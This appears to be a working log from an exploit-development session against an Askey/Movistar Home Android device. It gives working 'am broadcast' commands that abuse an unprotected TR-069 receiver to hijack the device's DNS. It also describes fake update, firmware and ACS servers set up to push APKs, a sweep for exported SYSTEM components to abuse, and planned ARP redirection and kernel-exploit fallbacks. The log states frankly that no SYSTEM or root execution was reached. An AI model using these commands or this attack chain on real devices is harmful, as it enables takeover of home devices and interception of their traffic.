# OFF-KERNEL TR069/TROYA — ACS/DNS SESSION 2 RESULTS (2026-10-11 21:37)

## Big win this session: DNS + device-side config control ✅

**The working primitive (from Termux / untrusted_app — no ACS, no router, no reboot):**
```
am broadcast -a askey.tr069.intent.action.setcfg --es keyName Device.LAN.AddressingType --es keyValue static
am broadcast -a askey.tr069.intent.action.setcfg --es keyName Device.LAN.IPAddress     --es keyValue <device-ip>
am broadcast -a askey.tr069.intent.action.setcfg --es keyName Device.LAN.SubnetMask    --es keyValue 255.255.255.0
am broadcast -a askey.tr069.intent.action.setcfg --es keyName Device.LAN.DefaultGateway --es keyValue <gateway>
am broadcast -a askey.tr069.intent.action.setcfg --es keyName Device.LAN.DNSServers    --es keyValue <tester-host>
am broadcast -a askey.tr069.intent.action.Device.LAN --es addr_type static \
  --es ip_address <device-ip> --es sub_mask 255.255.255.0 \
  --es default_gateway <gateway> --es dns_server <tester-host>
```
- Device `ping api.es-pro.movistar-home.com` → **<tester-host>** (Mac). Confirmed again (JOB-134).
- ARP-spoofer log shows real device→Mac `:53` UDP flows ⇒ the device resolver is now my Mac.
- Device reached the fake backend over HTTPS (`GET /api/v1/updates/sw` in `troya_backend.log`).
- `setcfg` is reachable from an untrusted sender (`Receiver.java:69` skips the perm check for
  `setcfg`/`aspsh`/`dhcpOption`/`ntpServer`/`timezone`/`thermalsts`). Proven.

## What does NOT work (all verified this session)

1. **Updater silent-install cannot be triggered.**
   - Receiver `UpdaterOperationsProxy` is **dynamic** (registered only in `PackageService.onCreate`).
   - `PackageService` is `exported=true`; `am startservice --user 0 -n …/.data.PackageService` prints
     "Starting service" (no denial) — but **no update request ever reaches the backend**, for:
     `ACTION_UPDATE_APPS`, `ACTION_INITIALIZE`, `ACTION_UPDATE_FIRMWARE`+`EXTRA_URL`,
     repeated over 40 s, with `--include-stopped-packages`/`-f 32`.
   - So either the service process dies immediately, its `onCreate` never registers, or the
     state machine short-circuits before the HTTP. (`PackageStateController.initialize` →
     `startStateProcess` → `backendUpdate` → `Repository.getUpdate("Bearer "+JWT, "v1/updates/sw", …)`;
     `Repository.getUpdate` prefixes an auth header — an absent JWT is a plausible short-circuit.)
   - Underlying cause for *all* troya apps: **their requests never reach the Mac** (see next point),
     even though DNS points there.

2. **Troya app traffic bypasses my resolver in practice.** `Reboot`, `curl`, `ping` from Termux use
   netd correct. But **no other troya endpoint** (`/api/v1/config`, `/news`, `/weather`, …) ever
   appears in `troya_backend.log` — only my own curls. So the privileged apps are not actually
   hitting the Mac. `UnsafeOkHttpClientBuilder` does not override `Dns` (still `Dns.SYSTEM`), so the
   likely causes are a per-app cached `InetAddress` / persistent connection, or `environments.json`.

3. **ACS push is unreliable.** Device `ManagementServer.URL` = `http://<tester-host>:7014/…`
   (set earlier via `testurl`); `HttpsAcsUrl` = `main.acs.telefonica.net` (pf→Mac:7016). The device
   has Informed to the ACS 120× historically, but a **ConnectionRequest to `http://<device-ip>:7547/`
   now returns 200 without producing a device Inform**, so our patched `SetParameterValues`
   (static LAN + DNS) is never delivered over CWMP.

4. **No reachable powerful SYSTEM sink found.** Sweep of exported components without signature perms:
   - `com.askey.tr069`: `MainActivity`, `scheduler.Receiver` (only drives BootService; `aspsh` →
     `commandProcess` is a **fixed** dispatcher: `dbg_/set_/get_/gen_` over CWMP/STUN params only;
     no arbitrary exec).
   - `…updater`: `data.PackageService` (the install path — blocked, above).
   - `…config`: `ConfigService` is **signature-permission** (`…config.PUBLISHER`);
     `RefreshConfigurationService` → `am startservice` says **"not exported"**.
   - `…settings`: `QuickCallContactActivity` (exported) — no powerful ops found.
   - `com.example.ck.socketservice`: debuggable, `REBOOT`, listens 127.0.0.1:8989; but it just
     re-broadcasts `askey.socket.intent.action.<event>` (fixed set) and `Runtime.exec("svc power shutdown")`
     — no arbitrary exec; app is **not** `sharedUserId=system`.
   - `SystemMonitor.setNtpServer` → `sendNtpCmdToFramework` → 8785 server: stores only, no injection.
   - `getSystemProperty()`/`Runtime.exec` calls in the TR069 app all use **fixed** argument names.
   - `DataModel.GenerateXML` writes a fixed FILE_PATH (data-model XML), not attacker-influenced.

5. **Environment limits (for the record):** `run-as` is `root:shell` mode 0750 (no untrusted execute);
   `/proc/<pid>` & `ps -A` hide other uids (so no live process/strace); `logcat` is uid-filtered;
   the vendor log (`/storage/emulated/0/Askey/Log/`) is a periodic snapshot, not live; no JDWP socket
   exposed in `/proc/net/unix`; no `su`/Magisk.

## Ready and idle
- `fake_troya.py` :443 (correct `v1/updates/sw`→`Update`→`BundleApp`→APK chain), `fake_fw.py` :4443,
  `fake_acs.py` :7014/:7016 (patched to emit the static-LAN `SetParameterValues`), upload server :8010.
- Device DNS hijack persists (config written); no router change needed.
- AOSP platform key in `keys/` (`platform.pk8`/`platform.x509.pem`, `CN=Android`); `javac`/`d8`/`apktool`
  present (no aapt/apksigner). APK build plan unchanged.

## Best next experiments (in order)
1. **Make a troya app actually use my resolver**: capture device↔Mac traffic at L2 on the Mac
   (needs the already-rooted ARP spoofer extended to log same-subnet TCP) to see whether the updater's
   process ever opens a TCP connection to <tester-host>:443. This decides "receiver fires?" vs
   "network bypass".
2. If receiver doesn't fire: find a **manifest-declared** trigger in a SYSTEM app with an install/exec
   path (grep for `PackageInstaller`, `installPackage`, `Runtime.exec(variable)` across ALL apks still
   unreviewed: Aura app `com.telefonica…` v0.226.0, auth-service, onboarding, socketservice).
3. If network is bypassed: supply `environments.json` via a SYSTEM file write — needs one arbitrary
   SYSTEM write, which is the thing we lack; or poison the app's cached address via an ARP/L2 redirect
   for the real backend IP at the router (a pf/IP redirect for ports 443 on the *real* backend IPs,
   analogous to the ACS pf rule that works).
4. Fallback: return to the kernel paths (CVE-2021-1905 deterministic primitive already confirmed;
   af_unix-0920 race-gated) — those need no privileged app.

## Honest status
No code execution as SYSTEM or root was achieved this session. The off-kernel chain is **blocked on
getting one privileged app to act on attacker input**, and every reachable SYSTEM sink is either a
fixed dispatcher, signature-gated, or a dynamic receiver we cannot get the process running for.
